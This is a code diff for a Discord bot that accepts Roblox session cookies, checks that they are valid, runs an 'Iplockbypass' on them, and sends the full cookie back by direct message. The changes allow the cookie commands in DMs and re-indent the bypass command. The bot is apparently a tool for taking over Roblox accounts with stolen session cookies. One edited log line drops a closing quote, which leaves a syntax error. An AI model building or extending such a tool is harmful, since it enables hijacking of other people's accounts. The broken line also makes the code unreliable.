@@ -88,29 +88,29 @@ async def on_ready():
 # Existing bypass command
 @bot.command()
 async def bypass(ctx, cookie: str):
-    try:
-        bypasser = Bypass(cookie)
-        result = bypasser.start_process()
+        try:
+            bypasser = Bypass(cookie)
+            result = bypasser.start_process()
 
-        embed = nextcord.Embed()
-        if "Error" in result:
-            embed.title = "Bypass Failed"
-            embed.description = result
-            embed.color = nextcord.Color.red()
-        else:
-            embed.title = "Iplockbypass Successful"
-            embed.description = f"{result}"
-            embed.color = nextcord.Color.green()
+            embed = nextcord.Embed()
+            if "Error" in result:
+                embed.title = "Bypass Failed"
+                embed.description = result
+                embed.color = nextcord.Color.red()
+            else:
+                embed.title = "Iplockbypass Successful"
+                embed.description = f"{result}"
+                embed.color = nextcord.Color.green()
 
-        await ctx.send(embed=embed)
-    except Exception as e:
-        error_embed = nextcord.Embed(
-            title="Error",
-            description=str(e),
-            color=nextcord.Color.red()
-        )
-        await ctx.send(embed=error_embed)
-
+            await ctx.send(embed=embed)
+        except Exception as e:
+            error_embed = nextcord.Embed(
+                title="Error",
+                description=str(e),
+                color=nextcord.Color.red()
+            )
+            await ctx.send(embed=error_embed)
+            
 @bot.command()
 async def vc(ctx, cookie=None):
     if not cookie:
@@ -118,13 +118,9 @@ async def vc(ctx, cookie=None):
         log(f'User {ctx.author} tried to use {settings.prefix}vc but did not provide a cookie.')
         return
 
-    # Check if the command is executed in a DM channel
-    if isinstance(ctx.channel, nextcord.DMChannel):
-        await ctx.send("This command cannot be used in DMs. Please use it in a server.")
-        return
-
-    # Delete the message if it's not in a DM
-    await ctx.message.delete()
+    # Skip message deletion in DMs
+    if not isinstance(ctx.channel, nextcord.DMChannel):
+        await ctx.message.delete()
 
     response = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
     if '"id":' in response.text:
@@ -153,13 +149,9 @@ async def vcr(ctx, cookie=None):
         log(f'User {ctx.author} tried to use {settings.prefix}vcr but did not provide a cookie.')
         return
 
-    # Check if the command is executed in a DM channel
-    if isinstance(ctx.channel, nextcord.DMChannel):
-        await ctx.send("This command cannot be used in DMs. Please use it in a server.")
-        return
-
-    # Delete the message if it's not in a DM
-    await ctx.message.delete()
+    # Skip message deletion in DMs
+    if not isinstance(ctx.channel, nextcord.DMChannel):
+        await ctx.message.delete()
 
     response = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
     if '"id":' in response.text:
@@ -173,7 +165,7 @@ async def vcr(ctx, cookie=None):
         await dm.send(embed=nextcord.Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
         await ctx.send(embed=embedVar)
     elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vcr with an invalid cookie.')
+        log(f'User {ctx.author} used {settings.prefix}vcr with an invalid cookie.)
         embedVar = nextcord.Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
         embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
         await ctx.send(embed=embedVar)
@@ -189,13 +181,9 @@ async def full(ctx, cookie=None):
         await ctx.send(embed=nextcord.Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
         return
 
-    # Check if the command is executed in a DM channel
-    if isinstance(ctx.channel, nextcord.DMChannel):
-        await ctx.send("This command cannot be used in DMs. Please use it in a server.")
-        return
-
-    # Delete the message if it's not in a DM
-    await ctx.message.delete()
+    # Skip message deletion in DMs
+    if not isinstance(ctx.channel, nextcord.DMChannel):
+        await ctx.message.delete()
 
     response = requests.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie})
     hidden = '```                       Hidden                  ```'
